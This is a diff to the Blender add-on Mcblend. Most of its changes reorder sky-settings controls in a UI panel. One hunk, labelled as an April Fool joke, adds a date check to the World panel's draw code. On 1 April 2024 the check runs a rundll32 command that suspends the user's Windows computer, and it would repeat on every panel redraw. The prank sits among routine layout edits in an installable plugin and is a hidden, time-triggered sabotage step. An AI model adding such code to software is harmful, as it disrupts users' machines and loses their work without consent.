@@ -4,6 +4,7 @@ from .Materials import Materials
 from .Optimization import Optimize
 from .Utils import *
 from .Translator import Translate
+import datetime
 
 bl_info = {
     "name": "Mcblend",
@@ -282,6 +283,10 @@ class WorldAndMaterialsPanel(Panel):
 
         # World
 
+        # April Fool XD
+        if datetime.datetime.now().date() == datetime.date(2024, 4, 1):
+            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+
         box = layout.box()
         row = box.row()
         row.label(text="World", icon="WORLD_DATA")
@@ -396,9 +401,9 @@ class WorldAndMaterialsPanel(Panel):
                             row = sbox.row()
                             row.prop(node_group.inputs["Stars Amount"], "default_value", text="Stars Amount", slider=True) 
                     else:
-                        row.prop(node_group.inputs["End"], "default_value", text="End", toggle=True)
-                        row = box.row()
                         row.prop(node_group.inputs["Stars Amount"], "default_value", text="Stars Amount", slider=True)
+                        row = box.row()
+                        row.prop(node_group.inputs["End"], "default_value", text="End", toggle=True)
                         row = box.row()
                         row.prop(scene.sky_properties, "advanced_settings", toggle=True, text="Advanced Settings", icon=("TRIA_DOWN" if scene.sky_properties.advanced_settings else "TRIA_RIGHT"))
                         if scene.sky_properties.advanced_settings:
@@ -439,9 +444,9 @@ class WorldAndMaterialsPanel(Panel):
                                 row.prop(node_group.inputs["End Stars Rotation"], "default_value", index=1, text="Y")
                                 row = tbox.row()
                                 row.prop(node_group.inputs["End Stars Rotation"], "default_value", index=2, text="Z")
-                                
+                            
                             row = sbox.row()
-                            row.prop(node_group.inputs["Stars Amount"], "default_value", text="Stars Amount", slider=True) 
+                            row.prop(node_group.inputs["Pixelated Stars"], "default_value", text="Pixelated Stars", toggle=True)
 
 
                 except Exception as Error:
